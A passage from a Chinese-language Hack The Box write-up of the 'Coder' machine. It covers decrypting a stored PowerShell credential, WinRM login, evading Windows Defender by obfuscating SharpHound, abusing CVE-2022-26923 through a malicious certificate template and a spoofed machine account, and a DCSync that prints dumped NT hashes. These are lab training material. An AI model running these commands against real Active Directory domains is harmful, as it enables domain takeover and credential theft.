class="line">+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN</span><br><span class="line">+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==</span><br><span class="line">diff --git a/key.key b/key.key</span><br><span class="line">new file mode 100644</span><br><span class="line">index 0000000..a6285ed</span><br><span class="line">--- /dev/null</span><br><span class="line">+++ b/key.key</span><br><span class="line">@@ -0,0 +1,32 @@</span><br><span class="line">+144</span><br><span class="line">+255</span><br><span class="line">+52</span><br><span class="line">+33</span><br><span class="line">+65</span><br><span class="line">+190</span><br><span class="line">+44</span><br><span class="line">+106</span><br><span class="line">+131</span><br><span class="line">+60</span><br><span class="line">+175</span><br><span class="line">+129</span><br><span class="line">+127</span><br><span class="line">+179</span><br><span class="line">+69</span><br><span class="line">+28</span><br><span class="line">+241</span><br><span class="line">+70</span><br><span class="line">+183</span><br><span class="line">+53</span><br><span class="line">+153</span><br><span class="line">+196</span><br><span class="line">+10</span><br><span class="line">+126</span><br><span class="line">+108</span><br><span class="line">+164</span><br><span class="line">+172</span><br><span class="line">+142</span><br><span class="line">+119</span><br><span class="line">+112</span><br><span class="line">+20</span><br><span class="line">+122</span><br></pre></td></tr></table></figure>
<p>我们这里解释一下Git中文件发生的变化：</p>
<p><strong>变化一：Get-ADCS_Report.ps1 文件的变化</strong></p>
<p>新增加了几行代码：</p>
<ul>
<li><code>Get-Content &quot;.\key.key&quot;</code>：从文件 <code>key.key</code> 中获取密钥</li>
<li><code>Get-Content &quot;.\enc.txt&quot; | ConvertTo-SecureString -Key $key</code>：从<code>enc.txt</code>中读取加密的字符串，并使用上一步获取的密钥进行解密，生成一个<code>SecureString</code>对象</li>
<li><code>$cred = New-Object -TypeName System.Management.Automation.PSCredential (&quot;coder\e.black&quot;,$pass)</code>：将解密后的字符串转换为 <code>PSCredential</code> 对象，和用户名<code>&quot;coder\e.black&quot;</code>一起构成完整的凭证信息</li>
</ul>
<p>修改了一出代码：</p>
<ul>
<li>原本的 <code>Send-MailMessage</code> 命令没有认证参数（<code>-Credential</code>），被修改为包含 <code>-Credential $cred</code>，使得发送邮件时使用经过解密的凭证进行身份验证</li>
</ul>
<p><strong>避免了将敏感信息（如明文密码）硬编码到脚本中</strong></p>
<p><strong>变化二：enc.txt文件新增</strong></p>
<p>这是加密后的数据</p>
<p><strong>变化三： key.key 文件新增</strong></p>
<p>这是密钥</p>
<p>那么现在我们就可以在我们自己的Windows上进行上面的操作，然后利用<code>(New-Object PSCredential $cred).GetNetworkCredential().Password</code>获取<code>coder\e.black</code>的网络凭据，完整过程为</p>
<p>还原enc.txt</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQANAA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==</span><br></pre></td></tr></table></figure>
<p>还原key.key</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">144</span><br><span class="line">255</span><br><span class="line">52</span><br><span class="line">33</span><br><span class="line">65</span><br><span class="line">190</span><br><span class="line">44</span><br><span class="line">106</span><br><span class="line">131</span><br><span class="line">60</span><br><span class="line">175</span><br><span class="line">129</span><br><span class="line">127</span><br><span class="line">179</span><br><span class="line">69</span><br><span class="line">28</span><br><span class="line">241</span><br><span class="line">70</span><br><span class="line">183</span><br><span class="line">53</span><br><span class="line">153</span><br><span class="line">196</span><br><span class="line">10</span><br><span class="line">126</span><br><span class="line">108</span><br><span class="line">164</span><br><span class="line">172</span><br><span class="line">142</span><br><span class="line">119</span><br><span class="line">112</span><br><span class="line">20</span><br><span class="line">122</span><br></pre></td></tr></table></figure>
<p>在Windows上运行下面powershell命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$key</span> = <span class="built_in">Get-Content</span> <span class="string">&quot;.\key.key&quot;</span></span><br><span class="line"><span class="variable">$pass</span> = (<span class="built_in">Get-Content</span> <span class="string">&quot;.\enc.txt&quot;</span> | <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-Key</span> <span class="variable">$key</span>)</span><br><span class="line"><span class="variable">$cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCredential</span><br><span class="line">(<span class="string">&quot;coder\e.black&quot;</span>,<span class="variable">$pass</span>)</span><br><span class="line">(<span class="built_in">New-Object</span> PSCredential <span class="variable">$cred</span>).GetNetworkCredential().Password</span><br><span class="line"></span><br><span class="line"><span class="comment">#或者 $cred.GetNetWorkCredential().Password</span></span><br></pre></td></tr></table></figure>
<p>如下图所示，我们获得了<code>e.black</code>域用户的密码<code>ypOSJXPqlDOxxbQSfEERy300</code></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404163002.png" alt="微信截图_20250404163002"></p>
<p>利用winrm登录获取用户flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.207 -u e.black -p ypOSJXPqlDOxxbQSfEERy300  </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404163505.png" alt="微信截图_20250404163505"></p>
<h2 id="域内权限提升"><a class="markdownIt-Anchor" href="#域内权限提升"></a> 域内权限提升</h2>
<h3 id="域内信息收集"><a class="markdownIt-Anchor" href="#域内信息收集"></a> 域内信息收集</h3>
<p>我们看一下<code>e.black</code>所在组</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /groups</span><br></pre></td></tr></table></figure>
<p>注意到下面红框中的<code>PKI Admins</code> ，我们需要看一下这个组的具体说明</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404164214.png" alt="微信截图_20250404164214"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;PKI Admins&quot;</span></span><br></pre></td></tr></table></figure>
<p>这是一个大发现，<code>e.black</code>所在<code>PKI Admins</code>组可以管理ADCS服务，为我们滥用ADCS指明了道路</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404164406.png" alt="微信截图_20250404164406"></p>
<h3 id="bloodhound"><a class="markdownIt-Anchor" href="#bloodhound"></a> Bloodhound</h3>
<p>和之前打过的<code>HTB-Mist</code>类似，我们上传旧版本SharpHound时会被Windows Defender拦截，这里因为我们有了域内账户的票据可以直接尝试利用<code>bloodhound-python</code>收集数据，或者直接上传最新版本的SharpHound也不会被杀，我在官方wp上看到了另一种方法–<strong>混淆SharpHound绕过Windows Denfender</strong></p>
<p>利用<a target="_blank" rel="noopener" href="https://github.com/h4wkst3r/InvisibilityCloak">InvisibilityCloak</a>这个项目，执行下面的命令进行混淆</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./InvisibilityCloak.py -d ../SharpHound -m reverse -n <span class="string">&quot;ObfuscatedHound&quot;</span></span><br></pre></td></tr></table></figure>
<p>然后回到SharpHound目录，并按照仓库README.md文件中的指引，使用 <strong>dotnet</strong> 构建可执行文件</p>
<p>注：这里可能会出现<code>Build failed</code>，但是不影响可执行文件的构建</p>
<p>这里为了方便我还是使用<code>bloodhound-python</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c All -u e.black -p ypOSJXPqlDOxxbQSfEERy300 -ns 10.10.11.207 -d coder.htb -dc dc01.coder.htb --zip</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404172937.png" alt="微信截图_20250404172937"></p>
<p>在BloodHound中分析，标记所有已经拥有的节点</p>
<p>首先先看一下<code>e.black</code>所有所在组</p>
<p><code>s.blade</code>所在组</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250404174300.png" alt="微信截图_20250404174300"></p>
<p>它在两个刚才没有枚举到的组中，分别是<code>BUILDAGENT MGMT</code>和<code>SOFTWARE DEVELOPERS</code>，我们看一下这两个组的说明</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425191000.png" alt="微信截图_20250425191000"></p>
<p>两个组都与TeamCity有关</p>
<p><code>SVC_TEAMCITY</code>是一个普通的域账户，没有什么特别的地方</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425191228.png" alt="微信截图_20250425191228"></p>
<h3 id="手工ad枚举"><a class="markdownIt-Anchor" href="#手工ad枚举"></a> 手工AD枚举</h3>
<p>首先先枚举一下此域中的组织单元</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADOrganizationalUnit</span> <span class="literal">-filter</span> * | <span class="built_in">select</span> Name</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425192022.png" alt="微信截图_20250425192022"></p>
<p>我们在上面知道域内存在<code>BUILDAGENT MGMT</code>组，同时组织单元作为一种逻辑容器可以用来组织和管理 AD 中对象（用户、计算机、组、子 OU等），管理员可以将 OU 的权限赋予某个组，我们根据组名可以猜测<code>BUILDAGENT MGMT</code>组对<code>BuildAgents</code>OU存在一些控制权限，但是在我们的bloodhound上并没有显示出来。</p>
<p>在进一步枚举之前我们获取一下OU的<code>DistinguishedName</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADOrganizationalUnit</span> <span class="literal">-filter</span> * | <span class="built_in">select</span> Name, DistinguishedName</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425203000.png" alt="微信截图_20250425203000"></p>
<p>接下来列出<code>BuildAgents</code>OU的ACL，查看谁对这个OU具有某种特定的权限</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>Get-Acl</code>：获取指定对象的访问控制列表（ACL），用于查看谁拥有何种权限。</p>
<p><code>&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</code>：域中OU对象的路径，前缀 <code>AD:</code> 表示使用的是Active Directory PS 驱动器</p>
<p><code>.access</code>：获取该对象的访问控制列表ACL中的所有访问控制项ACE</p>
</blockquote>
<p>这里存在大量输出，我们这里仅对我们控制的组的权限感兴趣，我们利用<code>where</code>进行一下简单的过滤</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\PKI Admins&quot;</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\Software Developers&quot;</span></span><br><span class="line">(<span class="built_in">Get-Acl</span> <span class="string">&quot;AD:OU=BuildAgents,OU=Development,DC=coder,DC=htb&quot;</span>).access | <span class="built_in">where</span> IdentityReference <span class="operator">-eq</span> <span class="string">&quot;coder\BuildAgent Mgmt&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>where</code>：用于对对象集合进行条件过滤</p>
<p><code>IdentityReference</code>：表示权限项是属于哪个用户或组的</p>
</blockquote>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250425204411.png" alt="微信截图_20250425204411"></p>
<p>我们看一下两个<code>ObjectType</code>我们具体可以操作什么东西</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectType: bf967a86<span class="literal">-0de6-11d0-a285-00aa003049e2</span>    ActiveDirectoryRights : CreateChild, DeleteChild</span><br><span class="line">ObjectType: <span class="number">72</span>e39547<span class="literal">-7b18-11d1-adef-00c04fd8d5cd</span>    ActiveDirectoryRights : Self, ReadProperty, WriteProperty</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/adschema/c-computer">bf967a86-0de6-11d0-a285-00aa003049e2</a>这个类代表域中的计算机帐户，我们在域中具有对他的<code>CreateChild</code>权限即在OU下创建对象的权限（如用户、组、计算机等），以及<code>DeleteChild</code>删除该 OU 下的对象的权限</p>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-validated-dns-host-name">72e39547-7b18-11d1-adef-00c04fd8d5cd</a>这个代表<strong>验证写入权限以启用与计算机名称和域名兼容的 DNS 主机名属性的设置</strong>，我们具有<code>ReadProperty</code>即可以读取对象的某些属性，<code>WriteProperty</code>即可以修改对象的属性，<code>self</code>允许用户自己修改自己的属性</p>
<h3 id="cve-202226923"><a class="markdownIt-Anchor" href="#cve-202226923"></a> CVE-2022–26923</h3>
<p>其实到这里我们需要利用的ADCS漏洞就已经很明显了，即我在前几个文章中分析的<a href="https://chromos2me.github.io/2025/04/11/CVE-2022%E2%80%9326923%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">CVE-2022–26923域内提权漏洞</a>，最早在Oliver Lyak的文章<a target="_blank" rel="noopener" href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4">Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923)</a>提出，接下来我们进行利用</p>
<p>注：此靶机发布时CVE-2022–26923已经被修复，但是漏洞分析博客中都会指出在<code>msPKI-EnrollmentFlag</code>属性中设置了新的<code>CT_FLAG_NO_SECURITY_EXTENSION (0x80000)</code>标志的证书模板将不会嵌入新的 <code>szOID_NTDS_CA_SECURITY_EXT OID</code>这个用于缓解CVE-2022–26923域内提权漏洞的标志，因此我们仍然可以利用CVE-2022–26923。因为我们能够控制<code>PKI Admins</code>组，我们可以为自己创造恶意模板供我们利用CVE-2022–26923，只需要通过设置恶意模板的CT_FLAG_NO_SECURITY_EXTENSION 参数为 524288（16进制为 0x80000）</p>
<p>现在我们需要在我们的靶机上克隆一个证书模板进行修改，为了方便我们的操作，我们可以利用<a target="_blank" rel="noopener" href="https://github.com/GoateePFE/ADCSTemplate">ADCSTemplate</a>这个powershell模块帮助我们导出、导入、删除、授权和发布AD域证书模板</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/GoateePFE/ADCSTemplate.git</span><br></pre></td></tr></table></figure>
<p>然后利用evil-winrm将其上传到我们的靶机上</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload ../RedTeam/ADCSTemplate/ .</span><br></pre></td></tr></table></figure>
<p>接下来导入powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> .\ADCSTemplate.psm1</span><br></pre></td></tr></table></figure>
<p>列出当前所有的模板</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADCSTemplate</span> | <span class="built_in">Format-List</span> DisplayName</span><br><span class="line"></span><br><span class="line">DisplayName : User</span><br><span class="line">DisplayName : User Signature Only</span><br><span class="line">DisplayName : Smartcard User</span><br><span class="line">DisplayName : Authenticated Session</span><br><span class="line">DisplayName : Smartcard Logon</span><br><span class="line">DisplayName : Basic EFS</span><br><span class="line">DisplayName : Administrator</span><br><span class="line">DisplayName : EFS Recovery Agent</span><br><span class="line">DisplayName : Code Signing</span><br><span class="line">DisplayName : Trust List Signing</span><br><span class="line">DisplayName : Enrollment Agent</span><br><span class="line">DisplayName : Exchange Enrollment Agent (Offline request)</span><br><span class="line">DisplayName : Enrollment Agent (Computer)</span><br><span class="line">DisplayName : Computer</span><br><span class="line">DisplayName : Domain Controller</span><br><span class="line">DisplayName : Web Server</span><br><span class="line">DisplayName : Root Certification Authority</span><br><span class="line">DisplayName : Subordinate Certification Authority</span><br><span class="line">DisplayName : IPSec</span><br><span class="line">DisplayName : IPSec (Offline request)</span><br><span class="line">DisplayName : Router (Offline request)</span><br><span class="line">DisplayName : CEP Encryption</span><br><span class="line">DisplayName : Exchange User</span><br><span class="line">DisplayName : Exchange Signature Only</span><br><span class="line">DisplayName : Cross Certification Authority</span><br><span class="line">DisplayName : CA Exchange</span><br><span class="line">DisplayName : Key Recovery Agent</span><br><span class="line">DisplayName : Domain Controller Authentication</span><br><span class="line">DisplayName : Directory Email Replication</span><br><span class="line">DisplayName : Workstation Authentication</span><br><span class="line">DisplayName : RAS and IAS Server</span><br><span class="line">DisplayName : OCSP Response Signing</span><br><span class="line">DisplayName : Kerberos Authentication</span><br><span class="line">DisplayName : Coder<span class="literal">-WebServer</span></span><br></pre></td></tr></table></figure>
<p>导出其中名为<code>Computer</code>的证书模板作为我们的样板，保存为JSON文件供我们之后进行修改</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Export-ADCSTemplate</span> <span class="literal">-displayname</span> Computer &gt; computer.json</span><br></pre></td></tr></table></figure>
<p>我们将生成的JSON对象读取到一个变量中，并将前文提到的 <code>msPKI-Enrollment-Flag</code> 属性设置为0x80000。然后，我们将修改后的 JSON 数据重新保存到 <code>computer.json</code> 文件中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="built_in">get-content</span> computer.json <span class="literal">-raw</span> | <span class="built_in">ConvertFrom-json</span></span><br><span class="line"><span class="variable">$a</span>.<span class="string">&#x27;msPKI-Enrollment-Flag&#x27;</span> = <span class="number">0</span>x80000</span><br><span class="line"><span class="variable">$a</span> | <span class="built_in">ConvertTo-Json</span> | <span class="built_in">Set-Content</span> computer.json</span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427124810.png" alt="微信截图_20250427124810"></p>
<p>接下来利用<code>computer.json</code>创建新的ADCS模板</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ADCSTemplate</span> <span class="literal">-displayname</span> pwned <span class="literal">-Publish</span> <span class="literal">-JSON</span> (<span class="built_in">gc</span> computer.json <span class="literal">-raw</span>)</span><br></pre></td></tr></table></figure>
<p>接下来利用<code>s.blade</code>去创建机器账户（即恶意计算机对象），利用impacket的addcomputer脚本即可完成，但是脚本中默认不允许用户控制 DNS 名称，我们将对脚本进行修改，先复制一份出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/doc/python3-impacket/examples/addcomputer.py addcomputer.py</span><br><span class="line"><span class="built_in">cat</span> addcomputer.py | grep -n dns </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427135402.png" alt="微信截图_20250427135402"></p>
<p>我们只需要将上图中所示的computerHostname修改为DC01即可</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427135633.png" alt="微信截图_20250427135633"></p>
<p>然后利用修改后的脚本添加计算机对象，注意这里是<code>s.blade</code>账户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py <span class="string">&#x27;coder.htb/s.blade:AmcwNO60Zg3vca3o0HDrTC6D&#x27;</span> -method LDAPS -computer-name <span class="string">&quot;pwned_pc&quot;</span> -computer-pass <span class="string">&quot;Passw0rd&quot;</span> -computer-group OU=BuildAgents,OU=Development,DC=coder,DC=htb</span><br></pre></td></tr></table></figure>
<p>注：这里的<code>-computer-group</code>需要是我们可以控制的<code>OU=BuildAgents,OU=Development,DC=coder,DC=htb</code></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427140616.png" alt="微信截图_20250427140616"></p>
<p>将新建的计算机对象注册到我们的恶意证书模板中</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADCSTemplateACL</span> <span class="literal">-displayname</span> pwned <span class="literal">-type</span> allow <span class="literal">-identity</span> <span class="string">&#x27;coder\pwned_pc$&#x27;</span> <span class="literal">-enroll</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>Set-ADCSTemplateACL</code>：修改一个证书模板的访问控制列表</p>
<p><code>-type allow</code>：设置允许权限</p>
<p><code>-enroll</code>：授权这个计算计算机账户可以申请证书</p>
</blockquote>
<p>注：如果注册的时候出现类似下面的错误说明机器账户并没有成功添加进域中，只要多添加几次就行了，在域中会有如下提示，这是因为靶机上存在机器账户清理脚本，会定期清理我们创建的机器账户</p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427152503.png" alt="微信截图_20250427152503"></p>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427152357.png" alt="微信截图_20250427152357"></p>
<p>为我们的机器账户申请恶意证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -u pwned_pc\<span class="variable">$@dc01</span>.coder.htb -p <span class="string">&#x27;Passw0rd&#x27;</span> -ca CODER-DC01-CA -template pwned -target dc01.coder.htb  </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427154103.png" alt="微信截图_20250427154103"></p>
<p>获取域控哈希，这一步因为需要与域控进行Kerberos认证，所以需要伪造一下时间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;21289 seconds&#x27;</span> certipy-ad auth -pfx dc01.pfx   </span><br></pre></td></tr></table></figure>
<p><img src="/2025/04/27/HTB-Machine-Coder/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20250427154626.png" alt="微信截图_20250427154626"></p>
<p>有了域控哈希，接下来打一个DCSYNC就可以下班了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump coder.htb/dc01\<span class="variable">$@dc01</span>.coder.htb -hashes aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94 -dc-ip dc01.coder.htb </span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">┌──(chromosome㉿kali)-[~/HTB/Coder]</span><br><span class="line">└─$ impacket-secretsdump coder.htb/dc01\<span class="variable">$@dc01</span>.coder.htb -hashes aad3b435b51404eeaad3b435b51404ee:56dc040d21ac40b33206ce0c2f164f94 -dc-ip dc01.coder.htb            </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:807726fcf9f188adc26eeafd7dc16bb7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:26000ce1f6ca4029ec5d3a95631e797c:::</span><br><span 